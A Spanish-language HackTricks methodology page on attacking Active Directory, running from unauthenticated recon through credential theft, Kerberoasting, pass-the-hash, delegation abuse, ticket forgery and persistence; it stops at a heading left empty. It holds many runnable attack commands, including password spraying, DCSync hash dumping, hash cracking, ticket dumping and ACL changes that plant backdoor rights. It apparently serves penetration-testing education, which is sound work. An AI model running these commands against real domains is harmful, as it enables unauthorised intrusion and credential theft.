# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Visión general básica

**Active Directory** sirve como una tecnología fundamental que permite a los **network administrators** crear y gestionar de forma eficiente **domains**, **users** y **objects** dentro de una red. Está diseñada para escalar, facilitando la organización de un gran número de usuarios en **groups** y **subgroups** manejables, mientras controla los **access rights** a distintos niveles.

La estructura de **Active Directory** está compuesta por tres capas principales: **domains**, **trees** y **forests**. Un **domain** abarca una colección de objetos, como **users** o **devices**, que comparten una base de datos común. Las **trees** son grupos de estos dominios enlazados por una estructura común, y un **forest** representa la colección de múltiples trees, interconectadas mediante **trust relationships**, formando la capa superior de la estructura organizativa. Se pueden designar **access** y **communication rights** específicos en cada uno de estos niveles.

Conceptos clave dentro de **Active Directory** incluyen:

1. **Directory** – Contiene toda la información relativa a los objetos de Active Directory.
2. **Object** – Denota entidades dentro del directory, incluyendo **users**, **groups** o **shared folders**.
3. **Domain** – Sirve como contenedor para los directory objects, con la posibilidad de que coexistan múltiples domains dentro de un **forest**, cada uno manteniendo su propia colección de objetos.
4. **Tree** – Un agrupamiento de domains que comparten un domain raíz común.
5. **Forest** – La cúspide de la estructura organizativa en Active Directory, compuesta por varias trees con **trust relationships** entre ellas.

**Active Directory Domain Services (AD DS)** abarca una serie de servicios críticos para la gestión centralizada y la comunicación dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **users** y **domains**, incluyendo **authentication** y funcionalidades de **search**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de **digital certificates** seguros.
3. **Lightweight Directory Services** – Da soporte a aplicaciones que usan directory mediante el **LDAP protocol**.
4. **Directory Federation Services** – Proporciona capacidades de **single-sign-on** para autenticar usuarios a través de múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con copyright regulando su distribución y uso no autorizados.
6. **DNS Service** – Crucial para la resolución de **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender cómo **attack an AD** necesitas entender muy bien el **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para tener una vista rápida de qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos **requires a full qualifid name (FQDN)** para realizar acciones. Si intentas acceder a una máquina por la dirección IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (Sin credenciales/sesiones)

Si sólo tienes acceso a un entorno AD pero no tienes credenciales/sesiones, podrías:

- **Pentest the network:**
- Escanear la red, encontrar máquinas y puertos abiertos e intentar **explot vulnerabilities** o **extract credentials** de ellas (por ejemplo, [las impresoras podrían ser objetivos muy interesantes](ad-information-in-printers.md)).
- Enumerar DNS podría proporcionar información sobre servidores clave en el domain como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la guía general [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar más información sobre cómo hacer esto.
- **Check for null and Guest access on smb services** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guía más detallada sobre cómo enumerar un servidor SMB puede encontrarse aquí:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guía más detallada sobre cómo enumerar LDAP puede encontrarse aquí (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Recolectar credenciales **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder al host **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recolectar credenciales **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer usernames/nombres de documentos internos, redes sociales, servicios (principalmente web) dentro de los entornos del domain y también de lo disponible públicamente.
- Si encuentras los nombres completos de los empleados de la empresa, podrías probar diferentes convenciones de AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Herramientas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Anonymous SMB/LDAP enum:** Consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Cuando se solicita un **username inválido** el servidor responderá usando el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitiéndonos determinar que el username era inválido. Los **usernames válidos** provocarán ya sea el **TGT in a AS-REP** response o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que el usuario necesita realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra la interfaz MS-NRPC (Netlogon) en domain controllers. El método llama a la función `DsrGetDcNameEx2` después de bindear la interfaz MS-NRPC para comprobar si el user o computer existe sin ninguna credencial. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación puede encontrarse [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si encuentras uno de estos servidores en la red, también puedes realizar **enumeración de usuarios contra él**. Por ejemplo, puedes usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  y en este ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener los **nombres de las personas que trabajan en la empresa** a partir del paso de recon que deberías haber realizado antes de esto. Con el nombre y apellido podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles nombres de usuario válidos.

### Knowing one or several usernames

Ok, si ya sabes que tienes un nombre de usuario válido pero no contraseñas... Entonces prueba:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_ puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá algunos datos cifrados por una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté usando una contraseña mala (¡ten en cuenta la password policy!).
- Ten en cuenta que también puedes **spray OWA servers** para intentar obtener acceso a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Podrías ser capaz de **obtener** algunos challenge **hashes** para crackear mediante **poisoning** algunos protocolos de la **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si has conseguido enumerar el active directory tendrás **más emails y una mejor comprensión de la network**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obtener acceso al entorno AD.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando **SMB relay to the DC está bloqueado** por signing, aún inspecciona la postura de **LDAP**: `netexec ldap <dc>` muestra `(signing:None)` / weak channel binding. Un DC con SMB signing required pero LDAP signing disabled sigue siendo un objetivo viable **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Credenciales de impresora client-side leaks → validación masiva de credenciales de dominio

- Las Printer/web UIs a veces **embed masked admin passwords in HTML**. Ver el source/devtools puede revelar cleartext (p. ej., `<input value="<password>">`), permitiendo acceso Basic-auth a repositorios de escaneo/impresión.
- Los trabajos de impresión recuperados pueden contener **plaintext onboarding docs** con contraseñas por usuario. Mantén las parejas alineadas al realizar las pruebas:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Robar credenciales NTLM

Si puedes **acceder a otros PCs o shares** con el **usuario null o guest** podrías **colocar archivos** (como un SCF file) que si de algún modo son abiertos **dispararán una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del NT hash. En lugar de brute-forcear frases de contraseña largas en tickets Kerberos RC4, NetNTLM challenges, o cached credentials, alimentas los NT hashes en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin llegar a conocer el texto plano. Esto es especialmente potente tras un compromiso de dominio donde puedes recolectar miles de NT hashes actuales e históricos.

Usa shucking cuando:

- Tienes un corpus de NT de DCSync, SAM/SECURITY dumps, o credential vaults y necesitas comprobar reutilización en otros dominios/forests.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, o blobs DCC/DCC2.
- Quieres probar rápidamente la reutilización para passphrases largas e in-crackeables e inmediatamente pivotar vía Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el NT hash (p. ej., Kerberos etype 17/18 AES). Si un dominio fuerza solo AES, debes volver a los modos regulares de contraseña.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history para obtener el conjunto más grande posible de NT hashes (y sus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas de history amplían dramáticamente el pool de candidatas porque Microsoft puede almacenar hasta 24 hashes previos por cuenta. Para más formas de obtener secretos de NTDS ver:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales SAM/SECURITY y cached domain logons (DCC/DCC2). Deduplica y añade esos hashes al mismo archivo `nt_candidates.txt`.
- **Track metadata** – Conserva el username/domain que produjo cada hash (incluso si la wordlist contiene solo hex). Los hashes que coincidan te indican inmediatamente qué principal está reutilizando una contraseña una vez Hashcat imprima el candidato ganador.
- Prefiere candidatos del mismo forest o de un forest confiable; eso maximiza la probabilidad de solapamiento al shuckear.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-candidate inputs **deben permanecer como NT hashes crudos de 32 hex**. Desactiva motores de reglas (no `-r`, no modos híbridos) porque el mangling corrompe el material clave candidato.
- Estos modos no son inherentemente más rápidos, pero el keyspace NTLM (~30,000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista curada de NT es mucho más barato que explorar todo el espacio de contraseñas en el formato lento.
- Siempre ejecuta la **última build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque los modos 31500/31600/35300/35400 llegaron recientemente.
- Actualmente no hay modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano porque sus claves se derivan vía PBKDF2 desde contraseñas UTF-16LE, no desde NT hashes crudos.

#### Example – Kerberoast RC4 (mode 35300)

1. Captura un RC4 TGS para un SPN objetivo con un usuario de bajo privilegio (ver la página Kerberoast para detalles):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckea el ticket con tu lista de NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus NT hashes existentes.

3. Pivot inmediato vía PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente puedes recuperar el texto plano más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Example – Cached credentials (mode 31600)

1. Dumpea cached logons desde una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 del usuario de dominio interesante en `dcc2_highpriv.txt` y shuckéala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una coincidencia exitosa devuelve el NT hash ya conocido en tu lista, demostrando que el usuario cacheado está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o brute-forcealo en modo NTLM rápido para recuperar la cadena.

El mismo flujo aplica a NetNTLM challenge-responses (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada una coincidencia puedes lanzar relay, SMB/WMI/WinRM PtH, o re-crackear el NT hash con máscaras/reglas offline.

## Enumerando Active Directory CON credenciales/sesión

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes algunas credenciales válidas o una shell como usuario de dominio, **debes recordar que las opciones dadas antes siguen siendo vías para comprometer a otros usuarios**.

Antes de comenzar la enumeración autenticada deberías conocer cuál es el **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Haber comprometido una cuenta es un **gran paso para empezar a comprometer todo el dominio**, porque vas a poder iniciar la **Active Directory Enumeration:**

Respecto a [**ASREPRoast**](asreproast.md) ahora puedes encontrar todos los usuarios potencialmente vulnerables, y respecto a [**Password Spraying**](password-spraying.md) puedes obtener una **lista de todos los usernames** e intentar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Otra herramienta increíble para recon en un active directory es [**BloodHound**](bloodhound.md). No es **muy sigilosa** (dependiendo de los métodos de colección que uses), pero **si no te importa** eso, deberías probarla. Encuentra dónde los usuarios pueden RDP, encuentra caminos hacia otros grupos, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) ya que pueden contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe** de la suite **SysInternal**.
- También puedes buscar en la base LDAP con **ldapsearch** para buscar credenciales en campos _userPassword_ & _unixUserPassword_, o incluso en _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para otros métodos.
- Si estás usando **Linux**, también podrías enumerar el dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- También podrías probar herramientas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracción de todos los usuarios del dominio**

Es muy fácil obtener todos los usernames del dominio desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Incluso si esta sección de Enumeración parece corta, es la parte más importante de todas. Accede a los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende cómo enumerar un dominio y practica hasta sentirte cómodo. Durante una evaluación, este será el momento clave para encontrar tu camino hacia DA o para decidir que no se puede hacer nada.

### Kerberoast

Kerberoasting implica obtener **TGS tickets** usados por servicios ligados a cuentas de usuario y crackear su cifrado—que se basa en las contraseñas de usuario—**offline**.

Más sobre esto en:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una vez que hayas obtenido algunas credenciales podrías comprobar si tienes acceso a alguna **máquina**. Para eso, podrías usar **CrackMapExec** para intentar conectar a varios servidores con diferentes protocolos, acorde a tus escaneos de puertos.

### Escalada de privilegios local

Si has comprometido credenciales o una sesión como un usuario de dominio normal y tienes **acceso** con este usuario a **cualquier máquina del dominio** deberías intentar encontrar la manera de **escalar privilegios localmente y saquear credenciales**. Esto es porque solo con privilegios de administrador local podrás **dumpear hashes de otros usuarios** en memoria (LSASS) y localmente (SAM).

Hay una página completa en este libro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) y una [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de sesión actuales

Es muy **improbable** que encuentres **tickets** en el usuario actual que te den permiso para acceder a recursos inesperados, pero puedes comprobar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has logrado enumerar Active Directory tendrás **más emails y una mejor comprensión de la red**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Busca Creds en Computer Shares | SMB Shares

Ahora que tienes algunas credenciales básicas deberías comprobar si puedes **encontrar** archivos **interesantes compartidos dentro del AD**. Podrías hacerlo manualmente pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de docs que necesitas revisar).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si puedes **acceder a otros PCs o recursos compartidos** podrías **colocar archivos** (como un archivo SCF) que si se acceden de alguna manera **dispararán una autenticación NTLM contra ti** para que puedas **steal** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para las siguientes técnicas un usuario de dominio normal no es suficiente; necesitas privilegios/credenciales especiales para realizar estos ataques.**

### Hash extraction

Con suerte has conseguido **comprometer alguna cuenta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluyendo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes en memoria y localmente.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Necesitas usar alguna **tool** que **perform** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inject** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **NTLM authentication**, ese **hash será usado.** La última opción es lo que hace mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tiene como objetivo **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo **Kerberos está permitido** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o valores hash. Ese ticket robado se usa para **impersonate the user**, obteniendo acceso no autorizado a recursos y servicios dentro de la red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **password** de un **administrador local** deberías intentar **login locally** en otros **PCs** con ella.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Tenga en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### MSSQL Abuse & Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlas para **ejecutar comandos** en el host MSSQL (si se ejecuta como SA), **robar** el NetNTLM **hash** o incluso realizar un **relay attack**.\
Además, si una instancia MSSQL es trusted (database link) por una instancia MSSQL diferente. Si el usuario tiene privilegios sobre la base de datos confiada, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas trusts pueden encadenarse y en algún punto el usuario podría encontrar una base de datos mal configurada donde pueda ejecutar comandos.\
**Los links entre bases de datos funcionan incluso a través de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Las suites de inventario y despliegue de terceros suelen exponer rutas poderosas hacia credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar TGTs desde la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation podrías incluso **comprometer automáticamente un Print Server** (esperemos que sea un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o computador se le permite "Constrained Delegation" podrá **impersonar a cualquier usuario para acceder a ciertos servicios en un equipo**.\
Luego, si **comprometes el hash** de este usuario/computador podrás **impersonar a cualquier usuario** (incluso Domain Admins) para acceder a algunos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegio **WRITE** sobre un objeto de Active Directory de un computador remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos de dominio** que podrían permitirte **moverte lateralmente/**escalar** privilegios** más adelante.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descubrir un **servicio Spool escuchando** dentro del dominio puede ser **abusado** para **adquirir nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recopilar credenciales desde la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente los usuarios accederán al sistema vía RDP, así que aquí tienes cómo realizar un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrador local** en equipos unidos al dominio, asegurando que sea **aleatoria**, única y con cambios frecuentes. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACLs solo a usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Recopilar certificados** desde la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si se configuran **templates vulnerables** es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una vez que obtienes privilegios de **Domain Admin** o mejor aún **Enterprise Admin**, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algunas de las técnicas comentadas antes pueden usarse para persistencia.\
Por ejemplo podrías:

- Hacer que usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer que usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Otorgar privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **Silver Ticket attack** crea un **TGS legítimo** para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la cuenta del PC**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica que un atacante obtiene acceso al **NTLM hash de la cuenta krbtgt** en un entorno Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Estos son como golden tickets pero forjados de una manera que **evita los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

